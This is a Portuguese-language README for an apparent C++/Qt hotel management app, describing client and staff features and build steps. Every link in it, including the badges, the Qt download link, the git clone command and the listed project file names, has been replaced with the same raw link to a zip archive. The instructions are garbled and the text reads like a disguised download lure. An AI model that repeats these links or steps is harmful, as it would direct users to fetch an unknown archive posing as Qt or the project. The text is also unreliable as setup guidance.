# 🏨 Sistema de Gestão de Hotelaria

![Language](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip%2B%https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
![Framework](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip%https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
![Database](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
![License](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)

  Um sistema desktop completo para gerenciamento de hotéis, com portais dedicados para clientes e colaboradores.

---

## 📋 Sobre o Projeto

Este projeto é um sistema de gerenciamento de hotelaria desenvolvido em **C++** com o framework **Qt**. A aplicação oferece uma interface gráfica completa e funcionalidades distintas para dois tipos de usuários: **clientes** e **colaboradores**, conectando-se a um banco de dados **SQLite** para gerenciar todas as operações.

---

## ✨ Funcionalidades Principais

O sistema é dividido em dois módulos principais, acessíveis a partir de uma tela de seleção inicial.

### 👤 Portal do Cliente
-   **Login e Cadastro**: Clientes podem criar uma conta e fazer login no sistema.
-   **Visualização de Quartos**: Permite aos clientes ver os detalhes dos quartos disponíveis.
-   **Reservas**: Funcionalidade para o cliente realizar e gerenciar suas próprias reservas.
-   **Pagamento**: Uma interface dedicada para a realização de pagamentos das reservas.
-   **Avaliação**: Tela para que os clientes possam avaliar sua estadia.
-   **Notificações**: Área para o cliente visualizar notificações importantes.

### 👨‍💼 Painel do Colaborador
-   **Login Restrito**: Acesso seguro para funcionários do hotel.
-   **Gestão de Clientes**: Os colaboradores podem cadastrar novos clientes e editar informações dos existentes.
-   **Gestão de Quartos**:
    -   Cadastro de novos quartos no sistema.
    -   Lista detalhada dos quartos com opções de filtro.
    -   Suporte a diferentes tipos de quartos: `QuartoSimples`, `QuartoComfort`, `QuartoSuite` e `QuartoMaster`.
-   **Gestão de Reservas**: Visualização e gerenciamento de todas as reservas feitas pelos clientes.
-   **Painel de Controle**: Uma tela principal que centraliza as funções do colaborador.

---

## 🛠️ Tecnologias Utilizadas

| Tecnologia | Descrição |
| :--- | :--- |
| **C++17** | Linguagem principal utilizada para toda a lógica do sistema. |
| **Qt 6** | Framework utilizado para a criação das interfaces gráficas (`Widgets`) e interação com o banco de dados (`SQL`). |
| **SQLite** | Sistema de banco de dados leve e baseado em arquivo, utilizado para armazenar todos os dados da aplicação. |
| **Qt Creator** | IDE recomendada para compilar e executar o projeto. |

---

## 🚀 Como Executar

Siga os passos abaixo para compilar e executar o projeto localmente.

### Pré-requisitos
-   **Qt 6 ou superior**: [Link para download do Qt](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
-   **Compilador C++**: (MSVC no Windows, GCC no Linux ou Clang no macOS)
-   **Qt Creator**: Geralmente instalado junto com o Qt.

### Passos
1.  **Clone o repositório:**
    ```bash
    git clone [https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip](https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip)
    ```
2.  **Abra o projeto no Qt Creator:**
    -   Abra o Qt Creator.
    -   Vá em `File > Open File or Project...`.
    -   Navegue até a pasta clonada e selecione o arquivo `https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip`.
3.  **Configure o Kit:**
    -   O Qt Creator deve detectar automaticamente os kits de compilação instalados. Selecione um kit compatível (ex: Desktop Qt 6.x.x).
4.  **Verifique o Banco de Dados:**
    -   Certifique-se de que o arquivo de banco de dados `db_hotel` está presente na pasta `dataBase`. O projeto está configurado para encontrá-lo no caminho relativo `../../dataBase/db_hotel` a partir do diretório de compilação.
5.  **Compile e Execute:**
    -   Clique no botão **Build** (ícone de martelo) ou pressione `Ctrl+B`.
    -   Clique no botão **Run** (ícone de play verde) ou pressione `Ctrl+R`.

---

## 📂 Estrutura do Projeto

A estrutura de arquivos foi pensada para ser modular e organizada, separando as responsabilidades de cada parte do sistema.
| Componente | Descrição |
| :--- | :--- |
| `clientes/` | Contém todos os fontes e UIs relacionados ao portal do cliente. |
| `colaboradores/` | Contém todos os fontes e UIs relacionados ao painel do colaborador. |
| `dataBase/` | Contém o arquivo de banco de dados SQLite do projeto. |
| `imagens/` | Armazena as imagens utilizadas na interface do usuário. |
| `https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip` | Arquivo principal de configuração do projeto Qt. |
| `https://raw.githubusercontent.com/ViniiGabriel/hotelQT/main/Normanesque/hotelQT.zip` | Ponto de entrada da aplicação, onde a janela principal é iniciada. |
